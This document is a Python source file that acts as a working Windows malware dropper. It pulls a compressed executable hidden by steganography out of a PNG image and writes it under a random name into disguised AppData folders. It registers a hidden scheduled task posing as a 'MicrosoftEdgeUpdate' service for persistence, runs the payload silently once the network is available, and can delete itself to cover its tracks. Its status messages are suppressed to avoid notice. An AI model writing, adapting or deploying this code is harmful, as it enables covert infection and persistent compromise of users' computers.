import base64
import zlib
import struct
import os
import subprocess
import tempfile
import platform
import sys
import threading
import time
import random
import string
import shutil
from datetime import datetime
import ctypes
from ctypes import wintypes

# Check for destruction mode
DESTRUCTION_MODE = len(sys.argv) > 1 and sys.argv[1] == '-d'

if DESTRUCTION_MODE:
    # print("💥 Self-Destruction Mode - Deleting Script Only")
    print("...")
else:
    print("......")

def extract_from_binary_file(filename="stm_embedded.png"):
    """Extract data from binary file using LSB method"""
    try:
        with open(filename, 'rb') as f:
            cover_data = f.read()
        
        # print(f"🖼️  Cover file loaded: {len(cover_data)} bytes")
        
        # Extract payload length from first 32 bits (4 bytes)
        length_bits = ''
        for i in range(32):
            if i >= len(cover_data):
                break
            length_bits += str(cover_data[i] & 1)
        
        if len(length_bits) < 32:
            return None
        
        # Convert 32 bits to 4 bytes, then to integer
        length_bytes = bytearray()
        for i in range(0, 32, 8):
            byte_bits = length_bits[i:i+8]
            length_bytes.append(int(byte_bits, 2))
        
        payload_length = int.from_bytes(length_bytes, 'little')
        
        # print(f"📊 Payload length: {payload_length} bytes")
        
        # Extract payload data
        total_bits_needed = 32 + (payload_length * 8) + (10 * 8)  # length + data + terminator
        
        if total_bits_needed > len(cover_data) * 8:
            # print("❌ Not enough data in cover file")
            return None
        
        # Extract payload bits (skip first 32 bits which were length)
        payload_bits = ''
        for i in range(32, 32 + (payload_length * 8)):
            if i >= len(cover_data):
                break
            payload_bits += str(cover_data[i] & 1)
        
        # Convert bits to bytes
        payload_bytes = bytearray()
        for i in range(0, len(payload_bits), 8):
            if i + 8 <= len(payload_bits):
                byte_bits = payload_bits[i:i+8]
                payload_bytes.append(int(byte_bits, 2))
        
        # Check for terminator
        if payload_bytes[-10:] != b"ENDPAYLOAD":
            # print("⚠️  Terminator not found, data may be corrupted")
            print("..")
        else:
            payload_bytes = payload_bytes[:-10]  # Remove terminator
        
        # print(f"🔄 Extracted {len(payload_bytes)} bytes")
        
        # Decode and decompress
        compressed_data = base64.b64decode(payload_bytes)
        exe_data = zlib.decompress(compressed_data)
        
        # print(f"✅ Data decompressed successfully")
        return exe_data
        
    except Exception as e:
        # print(f"❌ Binary extraction failed: {e}")
        return None

def get_current_user():
    """Get current username dynamically"""
    try:
        username = os.environ.get('USERNAME') or os.getlogin()
        return username if username else "DefaultUser"
    except:
        return "DefaultUser"

def get_user_profile_path():
    """Get user profile path dynamically"""
    username = get_current_user()
    user_path = os.path.expanduser("~") or os.environ.get('USERPROFILE') or f"C:\\Users\\{username}"
    return user_path, username

def create_deep_folder_structure():
    """Create deep folder structure for hiding executable"""
    user_path, username = get_user_profile_path()
    
    # Create nested folder structure
    deep_paths = [
        os.path.join(user_path, "AppData", "Local", "Microsoft", "Windows", "Explorer", "Cache"),
        os.path.join(user_path, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Cache"),
        os.path.join(user_path, "AppData", "Local", "Temp", "Microsoft", "Windows", "INetCache", "IE"),
        os.path.join(user_path, "Documents", "My Music", "Sample Music", "Cache")
    ]
    
    for deep_path in deep_paths:
        try:
            os.makedirs(deep_path, exist_ok=True)
            # print(f"📁 Created deep folder: {deep_path}")
            return deep_path, username
        except:
            continue
    
    # Fallback
    fallback = os.path.join(user_path, "AppData", "Local")
    os.makedirs(fallback, exist_ok=True)
    return fallback, username

def save_executable_to_deep_folder(exe_data):
    """Save executable to deep folder with persistent name"""
    target_folder, username = create_deep_folder_structure()
    
    # Generate persistent random name
    exe_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16)) + '.exe'
    exe_path = os.path.join(target_folder, exe_name)
    
    try:
        with open(exe_path, "wb") as f:
            f.write(exe_data)
        # print(f"💾 Executable saved: {exe_path}")
        return exe_path, username
    except Exception as e:
        # print(f"❌ Failed to save executable: {e}")
        return None, None

def create_task_xml(exe_path, username, task_name):
    """Create Windows Task Scheduler XML with network trigger"""
    current_time = datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
    
    xml_content = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>System maintenance task for {username}</Description>
    <Author>{username}</Author>
    <Date>{current_time}</Date>
  </RegistrationInfo>
  <Triggers>
    <!-- Trigger on system startup -->
    <BootTrigger>
      <Enabled>true</Enabled>
      <Delay>PT45S</Delay>
    </BootTrigger>
    <!-- Trigger on user logon -->
    <LogonTrigger>
      <Enabled>true</Enabled>
      <Delay>PT30S</Delay>
      <UserId>{username}</UserId>
    </LogonTrigger>
    <!-- Trigger when network becomes available -->
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-NetworkProfile/Operational"&gt;&lt;Select Path="Microsoft-Windows-NetworkProfile/Operational"&gt;*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT10S</Delay>
    </EventTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>{username}</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <ExecutionTimeLimit>PT1H</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT15M</Interval>
      <Count>3</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"{exe_path}"</Command>
      <WorkingDirectory>{os.path.dirname(exe_path)}</WorkingDirectory>
    </Exec>
  </Actions>
</Task>'''
    
    return xml_content

def setup_auto_scheduler(exe_path, username):
    """Setup automatic task scheduler"""
    try:
        # Generate task name
        task_name = f"MicrosoftEdgeUpdate{random.randint(1000, 9999)}"
        
        # Create XML content
        xml_content = create_task_xml(exe_path, username, task_name)
        
        # Save XML file
        xml_path = os.path.join(os.path.dirname(exe_path), f"{task_name}.xml")
        with open(xml_path, 'w', encoding='utf-16') as f:
            f.write(xml_content)
        
        # print(f"📄 Task XML created: {xml_path}")
        
        # Try to register task
        try:
            result = subprocess.run([
                'schtasks', '/create',
                '/tn', task_name,
                '/xml', xml_path,
                '/f'
            ], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            if result.returncode == 0:
                # print(f"✅ Task '{task_name}' registered successfully")
                return True
            else:
                # print(f"⚠️  Task registration failed: {result.stderr}")
                print("..")
        except Exception as e:
            print(f"⚠️  Task registration error: {e}")
        
        # Create batch installer as fallback
        batch_content = f'''@echo off
echo Installing {task_name} task...
schtasks /create /tn "{task_name}" /xml "{xml_path}" /f
if %errorlevel% equ 0 (
    echo Task installed successfully!
) else (
    echo Task installation failed. Try running as administrator.
)
pause
'''
        
        batch_path = os.path.join(os.path.dirname(xml_path), f"install_{task_name}.bat")
        with open(batch_path, 'w') as f:
            f.write(batch_content)
        
        # print(f"📝 Manual installer: {batch_path}")
        return False
        
    except Exception as e:
        # print(f"❌ Auto scheduler setup failed: {e}")
        return False

def test_network_connectivity():
    """Test if network is available"""
    try:
        result = subprocess.run(
            ['ping', '-n', '1', '8.8.8.8'],
            capture_output=True,
            timeout=5,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return result.returncode == 0
    except:
        return False

def execute_with_network_check(exe_path):
    """Execute payload when network is available"""
    def network_monitor():
        # print("🌐 Monitoring network connectivity...")
        
        # Check immediately first
        if test_network_connectivity():
            # print("✅ Network available - executing immediately...")
            try:
                subprocess.Popen(
                    [exe_path],
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                # print("🚀 Payload executed successfully")
                return
            except Exception as e:
                # print(f"❌ Immediate execution failed: {e}")
                print("...")
        
        # Monitor for network availability
        for _ in range(60):  # Check for 30 minutes max
            if test_network_connectivity():
                # print("✅ Network became available - executing...")
                try:
                    subprocess.Popen(
                        [exe_path],
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    # print("🚀 Payload executed successfully")
                    break
                except Exception as e:
                    print(f"...")
            
            time.sleep(30)  # Check every 30 seconds
    
    # Start network monitoring in background
    monitor_thread = threading.Thread(target=network_monitor, daemon=True)
    monitor_thread.start()

def secure_delete_file(file_path):
    """Securely delete file by overwriting and removing"""
    try:
        if not os.path.exists(file_path):
            return True
        
        # Get file size
        file_size = os.path.getsize(file_path)
        
        # Overwrite with random data multiple times
        with open(file_path, "r+b") as f:
            for _ in range(3):  # 3 passes
                f.seek(0)
                f.write(os.urandom(file_size))
                f.flush()
                os.fsync(f.fileno())  # Force write to disk
        
        # Finally delete the file
        os.remove(file_path)
        # print(f"🗑️  Securely deleted: {file_path}")
        return True
        
    except Exception as e:
        # print(f"❌ Failed to delete {file_path}: {e}")
        return False

def self_destruct():
    """Self-destruct this script only"""
    # print("💀 Initiating self-destruction of script...")
    
    script_path = os.path.abspath(__file__)
    
    # Create a batch file to delete this script after it exits
    batch_content = f'''@echo off
echo Cleaning up script...
timeout /t 2 /nobreak >nul
del /f /q "{script_path}"
del /f /q "%~f0"
echo Script deleted successfully.
'''
    
    batch_path = os.path.join(tempfile.gettempdir(), f"cleanup_{random.randint(1000, 9999)}.bat")
    
    try:
        with open(batch_path, 'w') as f:
            f.write(batch_content)
        
        # print(f"✅ Self-destruction sequence initiated")
        # print(f"💥 Script will be deleted in 2 seconds...")
        # print(f"ℹ️  All persistence (tasks & executables) remain intact")
        
        # Execute the batch file in background
        subprocess.Popen(
            [batch_path],
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
        )
        
        time.sleep(1)
        
    except Exception as e:
        # print(f"❌ Self-destruction failed: {e}")
        # Manual deletion attempt
        try:
            secure_delete_file(script_path)
        except:
            print("....")

def main():
    """Main extraction and execution routine with auto scheduler"""
    
    # Handle destruction mode
    if DESTRUCTION_MODE:
        self_destruct()
        return
    
    exe_data = None
    
    # Try extraction methods
    methods = [
        ("Binary file (stm_embedded.png)", lambda: extract_from_binary_file("stm_embedded.png")),
        ("Original PNG with LSB", lambda: extract_from_binary_file("stm.png"))
    ]
    
    for method_name, method_func in methods:
        try:
            print(f"🔄 Trying: {method_name}")
            exe_data = method_func()
            if exe_data:
                # print(f"✅ Successfully extracted using: {method_name}")
                # print(f"📁 Recovered EXE size: {len(exe_data)} bytes")
                break
        except Exception as e:
            print(f"....")
            continue
    
    if not exe_data:
        print("....")
        return
    
    # Save to deep folder structure
    print("...")
    exe_path, username = save_executable_to_deep_folder(exe_data)
    
    if not exe_path:
        print("....")
        return
    
    # Setup auto scheduler
    print("..")
    scheduler_success = setup_auto_scheduler(exe_path, username)
    
    # Execute with network monitoring
    print("...")
    execute_with_network_check(exe_path)
    
    # print("\n✅ Enhanced decoder setup complete!")
    # print(f"📁 Executable location: {exe_path}")
    # print(f"👤 User: {username}")
    
    if scheduler_success:
        print("......")
    else:
        print(".........")
    
    # Keep script running for a bit to allow network monitoring
    time.sleep(5)

if __name__ == "__main__":
    main()
